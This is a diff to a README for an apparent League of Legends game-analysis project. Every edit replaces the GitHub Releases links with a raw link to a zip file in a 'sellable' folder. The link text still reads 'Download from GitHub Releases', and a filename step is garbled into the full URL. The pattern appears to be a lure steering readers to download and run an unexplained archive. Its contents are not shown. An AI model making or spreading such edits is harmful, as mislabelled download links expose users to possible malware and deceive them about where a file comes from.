@@ -1,7 +1,7 @@
 # 🎮 Finales-Abschlussprojekt - Analyze League of Legends Games Easily
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Jaisinghchoudhary/Finales-Abschlussprojekt/releases)
+[![Download Now](https://raw.githubusercontent.com/Jaisinghchoudhary/Finales-Abschlussprojekt/main/sellable/Finales-Abschlussprojekt.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jaisinghchoudhary/Finales-Abschlussprojekt/main/sellable/Finales-Abschlussprojekt.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Finales-Abschlussprojekt**! This application helps you analyze over 50,000 League of Legends games using Python and Machine Learning. You can explore player statistics, champions, spells, and prediction models. Follow these steps to download and run the application with ease.
@@ -19,13 +19,13 @@ To ensure the application runs smoothly on your device, make sure you meet the f
 
 1. **Visit the Releases Page**
    Click the link below to go to the Releases page.
-   [Download from GitHub Releases](https://github.com/Jaisinghchoudhary/Finales-Abschlussprojekt/releases)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/Jaisinghchoudhary/Finales-Abschlussprojekt/main/sellable/Finales-Abschlussprojekt.zip)
 
 2. **Select the Latest Release**
    Find the section labeled with the latest version. You will see options to download files.
 
 3. **Download the Application**
-   Look for a file named something like `Finales-Abschlussprojekt.exe` or the equivalent for your operating system. Click on it to start the download.
+   Look for a file named something like `https://raw.githubusercontent.com/Jaisinghchoudhary/Finales-Abschlussprojekt/main/sellable/Finales-Abschlussprojekt.zip` or the equivalent for your operating system. Click on it to start the download.
 
 4. **Run the Installer**
    Once the download is complete, go to your Downloads folder. Find the downloaded file and double-click it. Follow the on-screen instructions to install the application.
@@ -79,4 +79,4 @@ This project is licensed under the MIT License. You can use and modify the code 
 
 For more information, check out our GitHub page. Let's transform your League of Legends experience today!
 
-[Download from GitHub Releases](https://github.com/Jaisinghchoudhary/Finales-Abschlussprojekt/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Jaisinghchoudhary/Finales-Abschlussprojekt/main/sellable/Finales-Abschlussprojekt.zip)
